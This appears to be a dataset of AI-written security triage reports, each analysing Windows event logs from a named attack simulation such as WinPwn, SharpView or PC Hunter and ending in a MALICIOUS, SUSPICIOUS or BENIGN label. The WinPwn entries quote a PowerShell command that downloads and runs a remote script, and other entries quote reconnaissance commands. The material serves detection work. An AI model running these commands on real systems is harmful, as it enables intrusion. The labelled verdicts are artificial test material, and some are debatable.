WinPwn - spoolvulnscan,"Upon reviewing the event logs provided, I conducted a detailed analysis focusing on key indicators of potentially malicious activity, including unusual process executions, suspicious command-line usage, privilege escalations, and any anomalies within various system, application, security, and PowerShell logs. Here are my findings:

### Sysmon Log
Sysmon logs show execution of several legitimate system binaries (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`). However, repetitive and rapid executions of `wevtutil.exe` and `conhost.exe` by the same user (SERVER002\admin_test) can be atypical if no legitimate use is expected, especially if they are used in quick succession without clear necessity. The execution of `whoami.exe` and `hostname.exe` seems benign if used for checking user and system information, unless part of a script intended for more nefarious purposes.

The most concerning finding is the execution of `powershell.exe` with a command line downloading a script from GitHub (`https://raw.githubusercontent.com/script`). The command appears to execute a potentially suspicious PowerShell script (`script.ps1`) from an external source directly into the system memory via `iex (Invoke-Expression)`, a known method for executing scripts without touching the disk, which is commonly employed by attackers.

### Application Log
The application log does not show any explicit suspicious activity. It simply indicates Windows Defender status being active, which is positive for basic security posture, and normal reporting from the Software Protection Platform Service.

### Security Log
Security logs show normal operations related to the time service with no explicit indicators of malicious activities. These logs typically show domain authentication events and sensitive system operations. There are no unexpected logon events or privilege escalations captured here.

### Windows PowerShell Log
The PowerShell logs corroborate findings from the Sysmon logs, showing that a script was indeed executed from an unauthorized remote source using `powershell.exe`. Such activities can be consistent with attempts to deploy payloads or backdoors directly onto the system through PowerShell, especially if authorized by a higher-privilege user account.

### System Log
Similarly, the system log does not present any exceptional behavior, aside from regular kernel and time service operations.

### Conclusion and Resolution
Given the evidence primarily from the PowerShell and Sysmon logs, where there is a clear execution of potentially suspicious and unauthorized PowerShell scripts from an external source, this activity qualifies as **highly suspicious and potentially malicious**. Downloading and executing scripts from unverified external sites during normal operations is a red flag, often associated with cyber threat activity.

**Resolution: MALICIOUS**

### Recommendations
- **Immediate containment**: Isolate the affected host (`Server002`) from the network to prevent any potential lateral movement.
- **Investigation**: Conduct a comprehensive investigation to understand if the script execution resulted in any changes, malware installations, or unauthorized accesses.
- **Forensics**: Conduct memory and disk analysis to extract more details about the executed script and any changes to the system.
- **Patch and Remediate**: Identify and remediate any vulnerabilities that could have allowed this event, including updating antivirus definitions, applying patch updates, and tightening PowerShell execution policies.
- **User Training and Awareness**: Educate users on the dangers of executing scripts from unverified sources, and review permissions for accounts like `SERVER002\admin_test`.
- **Monitoring and Alerting**: Increase monitoring and set up alerts for unusual PowerShell activities, especially those involving downloads and `Invoke-Expression`.
"
Enumerate COM Objects in Registry with Powershell,"After analyzing the provided Windows event logs, I have structured my findings based on different types of logs and identified potentially suspicious activities.

### System Logs
- **Windows Update Client Events**: Events related to updating Microsoft Defender Antivirus, which appears normal as part of routine security updates.
- **DCOM Event (Event ID 10010)**: Such DCOM events can be frequent on a system and often related to legitimate Windows operations. However, they should be monitored as they could sometimes be linked to misconfigurations or software bugs.

### Security Logs
- **Logon Events and Privilege Assignments (Event IDs 4624, 4672)**: These events show a system (SERVE002$) logon using the NT AUTHORITY\SYSTEM account, which is common for system-level processes. Equally, the privilege assignments for ""admin_test"" seem extensive (e.g., SeDebugPrivilege), which may be standard, but excessive privileges might indicate potential misuse.
- **Credential Validation Failures (Event ID 5379)**: Multiple attempts to use credentials for ""MicrosoftAccount:user=02txoixylodcstop"" failed during the audit. These could be benign, depending on whether they were expected, but warrant additional context to ensure no unauthorized attempts were made.

### Application Logs
- **Windows Defender Status (Event ID 15)**: Indicates Windows Defender is on, which is expected.

### Windows PowerShell Logs
- **PowerShell Script Execution**: The logs show the execution of a PowerShell script utilizing New-PSDrive and registry explorations. The complexity and nature of the script (e.g., creating instances from CLSIDs) look suspicious for potential reconnaissance or exploitation activities. It's important to confirm whether this was an authorized script execution.

### Sysmon Logs
- **Process Creation and Deletion Events**: Various system processes such as `wuauclt.exe`, `svchost.exe`, `conhost.exe`, appear frequently which is generally expected on Windows systems. However, notable attention is to PowerShell (`powershell.exe`) executions which relate to scripting/scripting attempts.

### Detailed Analysis
- **PowerShell Activity**: The use of PowerShell for registry access and CLSID enumeration suggests attempts at system exploration possibly associated with malicious intentions.
- **Repeated Login Failures**: Multiple (5379) events suggest unsuccessful credential accesses, likely requiring further checks on whether this was an expected behavior or an unauthorized attempt.

### Conclusion: SUSPICIOUS
- While many activities are typical for a Windows server, the usage of PowerShell for potentially intricate operations, and multiple failed credential validations, raise suspicions. Further investigation is warranted to piece together these elements, check against known baselines for the user ""admin_test"", and ensure no breach activities.

### Guidance
- **Action Items**:
  - Correlate PowerShell activity with authorized tasks or security operations.
  - Verify the legitimacy of credentials involved in the failed authentication attempts.
  - Review ""admin_test"" user activities for consistency with expected role privileges.
  - Monitor ongoing system activities for similar patterns and set alerts for unusual spikes or behavior.

Following these steps should provide further clarity on the legitimacy of these logged activities. If more signs of compromise appear during extended investigation, actions including a deeper forensic analysis and potential isolation might become necessary."
Windows MachineGUID Discovery,"Upon reviewing the Windows event logs provided, I have conducted a comprehensive analysis to identify any indicators of malicious activity or potential compromise. Here's a detailed assessment:

### Analysis:

1. **Processes Executed:**
   - **`whoami.exe` and `hostname.exe`:** These are legitimate Windows utilities used to fetch the current user and the host name of the machine. They were executed multiple times by the user `SERVER002\\admin_test`. Both these processes were initiated from a high-integrity level, but these operations on their own are not inherently suspicious.
   - **`wevtutil.exe`:** This utility is used to manage event logs. Its usage by `admin_test` is unusual unless specifically required for log querying or maintenance operations, which might justify further scrutiny if there's no legitimate reason for its use.
   - **`cmd.exe` execution of `reg query`:** The registry query command was executed to extract the `MachineGuid`. While querying system registries is not malicious, it can sometimes indicate attempts to gather system information, possibly for malicious purposes.
   - **`conhost.exe` following most command executions:** `conhost.exe` is a normal companion process to many command-line operations in Windows, providing required functionality for command processes.

2. **Time Change Events:**
   - **Time discrepancies noted in System and Security logs:**
     - The change in time (`Event ID 4616` in Security logs, and Kernel General events in System logs), initiated by `svchost.exe`, suggests a system time change. Such changes can be used to manipulate log timestamps and evade detection in incident timelines.
   - Changes were performed by `LOCAL SERVICE`, typically also indicative of legitimate maintenance operations. However, such changes warrant further investigation due to potential misuse by malware to obscure activities.

3. **Privilege Levels:**
   - All processes executed by `SERVER002\\admin_test` ran at a high integrity level, indicative of administrative privileges.

4. **Service Operations:**
   - **`sppsvc.exe`:** Software Protection Platform Service, executed by `NETWORK SERVICE`, is a legitimate operation for license verification.
   - **`TiWorker.exe` and `TrustedInstaller.exe`:** Responsible for Windows update and installation tasks, executed by `SYSTEM`. These processes seem normal in the given context.

### Conclusion:
- **Suspicious Activity:**
  - The querying of `MachineGuid` via the registry, frequent usage of `wevtutil.exe`, and the manual time change are activities that could be indicative of system reconnaissance, preparation for further exploitation, or an attempt to obfuscate malicious actions.
  
Given this context and without additional corroborating evidence, the anomalies do not conclusively point to malicious activity but suggest a sequence of actions that are uncommon for normal operational tasks and potentially preparatory steps for a compromise.

### Resolution:
- **SUSPICIOUS**: The series of events require more investigation. Determine the legitimacy and necessity of the actions performed by the administrative user `admin_test`, especially the purpose behind querying the `MachineGuid` and changing system time. Investigate any concurrent alerts on other security solutions or logs to check for correlating suspicious activities. Conduct user interviews or gather information on recent maintenance activities that might explain these behaviors.

### Guidance:
- **Immediate Actions:**
  - Review additional logs for correlated entries.
  - Check any recently installed software that may have required the unusual commands.
  - Conduct a thorough investigation involving any recent changes or updates to `Server002` that may explain these actions. Establish communication with the user to verify if the actions were legitimate or malicious.
  
- **Long-term Monitoring:**
  - Monitor for further usage of utilities like `wevtutil.exe`, and subsequent registry or system time modifications.
  - Implement alerts for such unusual command-line executions or time change activities to identify potential malicious behavior early."
Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,"After an extensive review of the provided Windows event logs from various channels, I have extracted details that may prompt further scrutiny into potential concerns. Here's a detailed breakdown:

### System Log
- **Time Synchronization Events (Event ID 1, 24)**: The logs show frequent adjustments of system time using `svchost.exe`. These adjustments are relatively minor and could be part of legitimate time resynchronization processes. However, unusual or frequent time changes could potentially be leveraged in various attack tactics.
  
### Security Log
- **Security Auditing (Event ID 4616)**: The security logs show time change events, which align with what was observed in the system logs. This is typical during time service resynchronizations but should be correlated with intentional administrative actions.

### Windows PowerShell Log
- **PowerShell Execution (Event ID 600)**: Multiple PowerShell instances were initiated with the execution of scripts involving `$env:computername -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime`. This appears related to managing local administrator passwords in environments with Microsoft Local Administrator Password Solution (LAPS). Such activity is usually legitimate in environments using LAPS for password management; however, if this is not expected behavior within the enterprise, it could be suspicious.

### Sysmon Log
- **Wevtutil and WHOAMI Executions**: The frequent execution of utilities like `wevtutil.exe`, `hostname.exe`, and `whoami.exe` points to standard administrative activities or automated scripts. Similar concerns arise with PowerShell processes. Wevtutil logs indicate activity by the `SERVER002\admin_test` user, which triggers additional processes like `conhost.exe` — generally typical of executing command-line utilities.
  
- **Microsoft Edge Updates**: The logs continuously document processes related to Microsoft Edge Updates (`MicrosoftEdgeUpdate.exe`). This includes various forms and execution phases which appear typical for an update or installation process.

### Application Log
- **Edge Update Service Stop**: Two service stop events indicate that the Edge Update service process stopped. There was no indication of error, and given the sysmon observations, this appears part of the lifecycle for Edge updates which often involves multiple start and stop events.

### Conclusion
The logs exhibit a mix of typical system management activity including time synchronization, software updates, and password management scripts if LAPS is being used. None of these seemed maliciously driven from the data available. The execution of regular command-line utilities and update processes were noted but within expected operational patterns. 

### Final Resolution
- **Resolution**: **BENIGN** - Consistent execution artifacts correlate with recognized routine system and administrative tasks and processes. Logs do not provide strong indicators of threats or compromise. However, if circumstances change or policies dictate tighter control over these specific observed actions, further deeper investigation or monitoring can be considered."
Examine domain password policy - Windows,"Upon reviewing the provided logs, I have conducted a detailed analysis and identified several entries that are noteworthy:

1. **Time Manipulation**:
    - **Kernel-General EventID 1 and 24**: These entries indicate a change in system time initiated by `svchost.exe`, which is associated with the Windows Time service. This isn't inherently suspicious unless it was unauthorized or unexpected. However, the adjustment from a future time to an earlier time could be indicative of attempts to alter time-based security logs or events.
  
2. **Privilege Assignment**:
    - **Security EventID 4672**: The user `admin_test` received a set of high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) which are standard for administrative accounts but should be evaluated for any unusual granting or usage patterns that don’t match typical operational activities.

3. **Process Execution**:
    - **Sysmon EventID 1 and 5**: There are multiple instances of legitimate system processes (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `net.exe`, `cmd.exe`) being executed by `admin_test` with a high integrity level. The command `cmd.exe /c net accounts /domain` suggests querying domain account settings, which could be standard user or administrator activity. However, it is often seen in reconnaissance phases of an attack where domain information is gathered.

4. **Login Events**:
    - **Security EventID 4624 and 4634**: Logon and logoff events for `admin_test` using NTLM authentication from an external client (`DESKTOP-3HL5B2P`) are noted. This remote connection could be typical if `admin_test` regularly accesses this server remotely, but it is worth confirming if such access was authorized and legitimate.

5. **Command Execution**:
    - Execution of commands like `whoami.exe` and `cmd.exe /c net accounts /domain` is observed frequently in system administration. However, the context and whether these were executed as part of normal operations or unauthorized access attempts need to be validated.

### Assessment:
The activities logged in suggest typical system operations; however, a few events merit further scrutiny due to the possibility of them being used in reconnaissance or cover-up actions, such as time change or domain account inquiries.

### Resolution: SUSPICIOUS
- **Suspicious Indicators**: The manual time rollback via `svchost.exe`, remote logons, and execution of processes that could serve reconnaissance purposes.
- **Recommended Actions**:
  - Validate with the user `admin_test` and IT policies if the observed commands and remote access were authorized.
  - Review if the change in time was scheduled as part of maintenance or reflects actual system time drift corrections.
  - Enhance monitoring on the server to capture potential further suspicious activities, focusing on the IP and account `admin_test`.

These actions will help determine whether the activities were benign or part of a larger malicious scheme."
Use of SecEdit.exe to export the local security policy (including the password policy),"### Analysis of Windows Event Logs:

#### Overview:
The provided Windows event logs from Sysmon primarily involve two types of processes:
1. **Microsoft Edge Update Processes**
2. **Basic Windows Utility Processes**

#### Detailed Analysis:

1. **Microsoft Edge Updates**:
   - The logs show multiple entries indicative of Microsoft Edge Update activity. This involves the execution of `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe` with various flags such as `/regserver`, `/svc`, `/c`, `/ua`, and `/installsource core`.
   - These processes are executed by `NT AUTHORITY\SYSTEM`, indicating their elevated privileges typical for system update services.
   - The update-related activities, such as registration and service start-up, appear consistent with legitimate software update mechanisms for Microsoft Edge. The file versions and hashes provided also match known versions, further indicating benign activity.

2. **Routine Windows Utility Execution**:
   - The logs document the execution of standard Windows utilities like `whoami.exe`, `cmd.exe`, `SecEdit.exe`, and `conhost.exe`, frequently performed by the `SERVER002\admin_test` user.
   - These actions include checking user information and exporting security policy settings, which could be part of regular administrative tasks or scripts executed under elevated user privileges (`IntegrityLevel=""High""`).

3. **Viewing and Managing Event Logs**:
   - The presence of `wevtutil.exe` in the logs suggests interaction with Windows Event logs, which might be the result of log querying, exporting, or clearing. This activity, performed by `SERVER002\admin_test`, is typical for administrators reviewing or backing up logs.
   - The pattern of frequent event log interactions might warrant further review to ensure they're consistent with administrative operations and not indicative of log tampering or covering tracks.

#### Assessment:

- **Microsoft Edge Update Activities**: Execution patterns and commands appear consistent with legitimate update activities. No irregularities in the process lineage or command structure suggest otherwise. Legitimate organization-associated hashes and file paths were consistent.
  
- **Utility and Event Log Interactions**: Execution of utilities like `whoami` and `hostname` by `admin_test`, along with event log interactions through `wevtutil.exe`, are often encountered in administrative or automated maintenance operations but can raise suspicion if excessively repeated or if the `admin_test` account showed unusual activity scopes.

#### Conclusion:

Based on the analysis:
- The logs show patterns consistent with legitimate update mechanisms for Microsoft Edge and routine administrative actions, including using common Windows tools and interacting with event logs.
- The quick succession and nature of `wevtutil.exe` executions should be validated against known administrative operations but aren't conclusively malicious without further contextual evidence (e.g., suspicious external access or failed administrative tasks triggering security protocols).

### **Resolution**: **BENIGN**

**Guidance**: 
- While the activities appear benign, it's still good practice to verify the legitimacy of administrative actions involving frequent log file access or modifications by cross-referencing change management records and system maintenance schedules.
- Monitor for any deviations in expected system behavior that could align with overlooked indicators of compromise, especially in future logs or related systems."
System Discovery using SharpView,"Based on the provided event logs, here is a detailed analysis and assessment:

### Anomalies and Suspicious Activities:

1. **PowerShell Execution:**
   - There are multiple instances of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` executing with the same user `SERVER002\admin_test`.
   - Of particular concern is the execution of PowerShell with the command line invoking `SharpView.exe` with various potentially suspicious commands like `Invoke-ACLScanner`, `Invoke-script`, and `Find-DomainShare`. These commands are often associated with security assessments and could potentially be used for malicious purposes such as privilege escalation or reconnaissance, especially if unauthorized.

2. **Wevtutil and Conhost Executions:**
   - We see multiple instances of `wevtutil.exe` and `conhost.exe` being executed within a short time frame. While `wevtutil.exe` is a legitimate tool used for managing event logs, frequent and rapid invocation may be suspicious if it's not part of regular administrative tasks.
   - `conhost.exe` is also executed multiple times, but it seems to follow the usage of legitimate applications. However, its frequent invocation along with `wevtutil.exe` could suggest potential attempts to manipulate or extract logs.

3. **System and Application Behavior:**
   - Several system level process executions such as `TiWorker.exe`, `CompatTelRunner.exe`, and telemetry-related services are visible and seem consistent with typical system update and maintenance activities. 
   - The security logs show actions consistent with system services and updates but repeated error codes (`ReturnCode=""3221226021""`) suggest unsuccessful credential retrievals, which could indicate attempted unauthorized access or misconfigurations.

### Assessment of Malicious Activity:

- **PowerShell Activity:**
  The execution of PowerShell with parameters resembling known offensive tools (like SharpView) is a significant red flag. While not outright confirmation of malicious activity, without explicit authorization for such tools in the environment, their presence suggests an elevated risk of compromise.

- **Log Management Utilities:**
  The frequent invocation of `wevtutil.exe` can be a tactic used by threat actors to clear or manipulate logs to cover their tracks.

### Resolution:

Based on the analysis, the activities logged fall into the resolution category of:

- **SUSPICIOUS**

The investigation has revealed suspicious activity that requires further attention. It is advisable to:
- Conduct a deeper investigation into the source and authorization of the PowerShell commands.
- Examine any history or context of infrastructure changes or penetration tests that could explain the execution of such tools.
- Review user access logs and correlate them with any other system changes or unusual behaviors.
- If unauthorized use of offensive tools is confirmed, consider a broader assessment of network security and integrity to identify potential unauthorized access or data exfiltration risks. 

These steps should help in clarifying whether the suspicious activities are benign system management tasks or indicative of a potential breach."
Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,"Upon analyzing the provided logs for indicators of malicious activity, here is the detailed examination:

### System Logs:
- **Time Change Events**: The logs feature multiple events indicating changes in the system time, involving `svchost.exe`, associated with Windows services. The events show small time adjustments typical of synchronization activities. These records by themselves, without more context, don't inherently suggest malicious actions as time synchronization is a routine operation.

### Sysmon Logs:
- **Process Executions**: Various processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `powershell.exe` were executed by the user `SERVER002\admin_test`. These are standard Windows utilities often used for legitimate system administration tasks. However, their execution in swift succession could suggest script-driven automation or a batch operation.

- **`cmd.exe` Launching PowerShell**: The execution of `cmd.exe` with PowerShell commands to inspect antivirus products (`Get-CimInstance` and `Get-WmiObject`) appears suspicious. While this might be part of a routine security audit or check, its execution could also signify a reconnaissance activity by an intruder.

- **Microsoft Edge Update Processes**: Multiple instances of `MicrosoftEdgeUpdate.exe` and its related components ran under `NT AUTHORITY\SYSTEM`. This typically indicates an automated update process, likely benign, given the frequent updates of browser software.

### Windows PowerShell Logs:
- **PowerShell Sessions**: The PowerShell logs corroborate the Sysmon events with evidence of PowerShell commands targeting security center namespaces (`Get-CimInstance` and `Get-WmiObject`). These commands are not inherently malicious but could be used for gathering system information maliciously if executed without authorization.

### Application Logs:
- **Edge Update Service**: Noticeable application log entries confirm Edge update services stopping, consistent with the observed Sysmon entries.

### Security Logs:
- **Event ID 4616**: Security logs also reflect changes to the system time, which appear routine and not indicative of unauthorized activity.

### Assessment:
- **Suspicious Behavior**: While most of the logged activities could be associated with legitimate system administration tasks, some entries warrant further investigation, especially the use of `cmd.exe` and PowerShell for querying antivirus products, as they might reflect a script intended for reconnaissance.

### Resolution:
Given the evidence and the context provided:
- **Resolution: SUSPICIOUS**

### Recommendations:
1. **Investigate the Context of PowerShell Commands**: Verify if the PowerShell commands for querying antivirus products had legitimate reasons, such as a scheduled security compliance check.

2. **Inspect User Activity**: Review activities from the user `SERVER002\admin_test` around the log times to confirm if these actions align with typical tasks or scheduled jobs.

3. **Monitor for Reoccurrence**: Implement monitoring to flag unusual combinations of these processes running together, especially if initiated by remote sessions or unexpected users.

4. **Harden Security Configurations**: Ensure all event logs capture detailed command-line arguments where possible, and utilize Sysmon configurations to better filter and alert on potentially malicious behaviors."
WinPwn - PowerSharpPack - Watson searching for missing windows patches,"After a detailed analysis of the provided logs, several key observations indicate potential malicious activity. Below is the examination of the logs across different categories:

### Application Log Analysis:
- The log entries themselves appear benign, highlighting normal operations such as the activation of Windows Defender, which suggests that the security software is running as expected.

### Windows PowerShell Log Analysis:
- **PowerShell Events (Event ID 600):** Multiple PowerShell executions with the command-line `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/script.ps1'); Invoke-watson}` are highly suspicious. 
  - The use of `iex` (Invoke-Expression) and `new-object net.webclient` to download and execute a script from a URL indicates potential remote code execution, which is a classic malicious behavior pattern used for downloading and executing payloads.

### Sysmon Log Analysis:
- **Process Execution (Event ID 1 and 5):** There are multiple events in rapid succession showcasing the execution of potentially normal system processes (`wevtutil.exe`, `conhost.exe`). 
  - However, the presence of `powershell.exe` executing from a URL as seen in the PowerShell logs steps this beyond regular administrative scripting and aligns consistently with the scripting execution observed in the PowerShell logs.
- **Process Creation with High Integrity:** The processes executed under a high integrity level indicate possible attempts to perform actions with elevated privileges, which can be typical in attempts to escalate privileges maliciously.

### Security Log Analysis:
- The Security logs do not show explicit unauthorized access or failed attempts, which could mean any malicious activity might have successfully bypassed simple security or auditing checks expected in these events.

### System Log Analysis:
- System logs suggest normal operations but adjustments in system time by `svchost.exe`, while not directly indicative of malicious activity, when associated with the suspicious PowerShell events could suggest timeline alignment to obscure logs or time-stamp logs for forensic analysis disruption.

### Conclusion:
Given the PowerShell logs that indicate potentially harmful remote script execution, and Sysmon logs corroborating PowerShell execution with high privileges, the situation is best categorized as:

**Resolution: MALICIOUS**

### Guidance:
1. **Immediate Isolation:** The server (Server002) should be isolated from the network to prevent further potential spread or data exfiltration.
2. **Incident Response:** Engage your incident response team to perform a deeper forensic analysis and check for any other potential indicators of compromise across other systems.
3. **Remediation Actions:** If confirmed malicious, steps should be taken to remove malicious scripts and any associated malware, and the integrity of the system should be evaluated.
4. **Reviewing Security Controls:** Ensure additional monitoring for `PowerShell` and network activity, and consider enhancements to current security measures, such as disabling or restricting PowerShell for unauthorized personnel.
5. **User Awareness Training:** Reinforce user cybersecurity awareness, focusing on the dangers of executing or allowing the execution of scripts from untrusted and unaudited sources."
Process Discovery - PC Hunter,"Upon reviewing the provided logs, several observations and concerns arise regarding potential malicious activity:

1. **Overall Context**:
   - The series of logs suggest a scenario where various high-privilege actions and potentially unwanted software execution occur, specifically around the timeframe of October 22, 2024.
   - The recurring activity for the user ""admin_test"" on ""Server002"" shows heightened privileges and multiple logon events and processes execution. This activity could either be legitimate administrative actions or suspicious if not expected.

2. **Security Log Observations**:
   - The `EventID 4672` entries on `Server002` contain the assignment of highly privileged rights to the user ""admin_test"". These privileges include sensitive ones such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` which can be exploited for malicious purposes.
   - Multiple `EventID 4624` logon events show logons with the NTLM authentication, and logon type 3 (network logon), which are normal in network environments, but the brief occurrence and structure need scrutiny based on usage patterns.

3. **PowerShell Activity**:
   - The execution of PowerShell commands (`EventID 600`) invoking `""C:\\Temp\\Externalfiles\\PCHunter_free\\PChunter64.exe""` stands out as potentially malicious. ""PC Hunter"" is a tool often used in both legitimate system administration and by attackers for stealthy system activities, highlighting risk if unchecked access is unintended.
   - Execution context `HostApplication=powershell.exe` with command lines using `Start-Process` can be indicative of scripted or automated tasks that need verification against baselines for legitimacy.

4. **Sysmon Observations**:
   - The Sysmon logs indicate multiple instances of process creation (`EventID 1` and `5`) involving `PCHunter64.exe` executed by high-integrity PowerShell sessions. Also, the presence of `conhost.exe` processes, while common, are seen in conjunction with processes not routinely expected, like `wevtutil.exe` and `hostname.exe`, again mapping back to ensuring activity is anticipated.
   - `ProcessId 3580` execution of `PCHunter64.exe` is potentially unauthorized tool use and logs are central to assessing whether elevated admin rights are overextended.

5. **Guidance and Resolution**:
   - **Assessment**: The combination of administrative privilege escalation, PowerShell script execution, and usage of potentially dual-use software without direct context from intended operations suggests a troubling pattern that goes beyond typical benign scenarios.
   - **Threats/Risks**: The threat vectors primarily involve potential privilege abuse and execution of unauthorized software that could facilitate system compromise or information disclosure.
   - **Recommended Actions**: Initiate an exhaustive root cause analysis. Verify user ""admin_test"" login legitimacy and usage appropriateness. Assess whether the presence and execution paths for `PCHunter64.exe` align with known administrative policy or identify as unauthorized and potentially rogue behavior. Correlate logs with network monitoring, endpoint security incidents, and any corresponding IT administration tickets.
   - **Resolution**: Based on the unique usage of sensitive privileges and PowerShell command context, classify as ""SUSPICIOUS"" pending further verification or dismissal through corroborated analysis against normal system administration functions and records.

Proceed to consult any relevant stakeholders or respective infosec teams to clear up context discrepancies or potential threat avenues discovered."
Discover System Language with chcp,"Based on the logs provided, let's analyze potential indicators of malicious activity:

### Analysis

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:** 
   - There are numerous instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\\admin_test`. `wevtutil.exe` is a legitimate utility for managing event logs. Similarly, `conhost.exe` is used for hosting console windows. While their usage on their own is not inherently malicious, the frequent and rapid execution of these processes could suggest attempts to tamper with logs (e.g., clearing or exporting logs). This warrants further investigation.
   
2. **Use of `hostname.exe`, `whoami.exe`, `cmd.exe`, and `chcp.com`:** 
   - These commands are commonly used for basic system information gathering. Their execution does not directly indicate malicious activity but could represent reconnaissance or enumeration activity by an attacker. Running these commands does not inherently indicate a compromise unless their use is out of the ordinary or excessive. 

3. **Privilege Escalation Privileges (Event ID 4672):** 
   - The account `admin_test` is granted significant privileges typically associated with administrative tasks, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`. If this is unexpected, it could indicate a threat where an attacker has obtained elevated permissions.

4. **Suspicious Time Change Activity:**
   - There is an adjustment in the system time captured by several logs. Time changes can sometimes signify attempts to cover tracks or revert system timestamps before or after carrying out illicit activities. However, without additional context, this could merely reflect a routine system update or drift correction.

5. **Account Activities (Event IDs 4624, 4634):**
   - Login and logout activities are visible for the `admin_test` account. LogonType ""3"" indicates a network logon, which can be typical for remote connections. Given the presence of multiple high-ranked privileges, it would be prudent to verify the legitimate use of the account’s capabilities.

### Summary and Resolution

Based on the analysis of the provided logs, the following resolution can be given:

- **Resolution: SUSPICIOUS**

While we did not find conclusive evidence of outright malicious activity, there are sufficient anomalies and behaviors that deviate from normal operations:
- The frequency and timing of command-line utility usage (`wevtutil.exe`, `conhost.exe`, etc.).
- The granting of many high-privilege settings to an account (`admin_test`), depending on context.
- Time adjustment activities that need to be validated against scheduled system maintenance or updates.

### Guidance

- **Conduct a Deeper Investigation:**
  - Correlate the usage of these binaries with user activity and context (e.g., scheduled tasks, administrative duties).
  - Check for unauthorized modifications or access to log files.
  - Review privilege escalation logs to ensure no illicit permission changes were made.
  - Validate time change against known system updates or corrections.

- **Monitor and Alert:**
  - Implement continuous monitoring for repetitive or abnormal use of administrative utilities.
  - Set up alerts for significant privilege usage and system-wide time adjustments.

- **Conduct a Security Audit:**
  - Ensure the `admin_test` account is being used legitimately and is not compromised.
  - Cross-reference network logs and endpoint security controls to gather more context around the `192.168.0.102` IP address and the activities emanating from it."
Process Discovery - wmic process,"Upon reviewing the provided logs, here's a detailed analysis:

**1. Application Log Analysis**
- The application log contains an event related to the ""Software Protection Platform Service,"" which is routine for Windows systems and not inherently suspicious. This log does not provide any indications of malicious activity.

**2. Security Log Analysis**
- Event ID 4616 from ""Microsoft-Windows-Security-Auditing"" indicates changes to the system time. The time was set back from 19:22:02 to 19:21:35, which can be suspicious if not performed by an authorized process or user, as time changes can be used to cover tracks or manipulate scheduled tasks. 
- The time change was executed by ""svchost.exe"" under the ""LOCAL SERVICE"" account. While `svchost` is a legitimate system process, unauthorized time changes could merit further investigation.

**3. Sysmon Log Analysis**
- Multiple events are logged for processes like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `cmd.exe`, typically used in administrative or script-driven tasks.
- Notably, `wevtutil.exe` is responsible for command-line access to Windows Event Logs, and heavy usage or unexpected contexts might indicate log tampering.  
- `whoami.exe` and `hostname.exe` are legitimate utilities for retrieving system and user information but can be used during reconnaissance activities.
- `WMIC.exe` is used with the `/format:list` option, which might indicate system information gathering. However, it is typically used in routine administrative tasks. 
- No anomalous hashes or unusual command lines appeared in these events. The actions appear legitimate but should be cross-referenced with user activity.

**4. System Log Analysis**
- Several Kernel-General and Time-Service events correlate with the time change seen in the security log. The log confirms that the time change reason is noted as ""1"" (user or software requested). This supports the same findings as the security log about the time change.

**Assessment:**
- The overall activity captured in the logs largely pertains to routine system operations and administrative commands. However, the time change presents a potential anomaly.
- Time changes can be legitimate when performed by system processes or updates, but unauthorized changes can indicate attempts to manipulate scheduled operations or cover malicious activities. Given this is the only notable anomaly, it warrants further scrutiny.

**Resolution:**
- **SUSPICIOUS:** The logs contain a potential indicator of concern due to the backdating of system time if not an authorized action. Further investigation into who initiated the time change and why it was necessary is advised. Investigate user activities and cross-reference with known schedules or maintenance tasks during the timeframe of these log entries.

**Guidance:**
- Verify if any authorized updates or tasks were performed during this time.
- Check if there's a legitimate administrative action documented for the time change.
- Conduct a user and process audit to ensure these activities align with expected system use.
- Increase monitoring on the host for any unusual activities related to time manipulation or use of administrative tools."
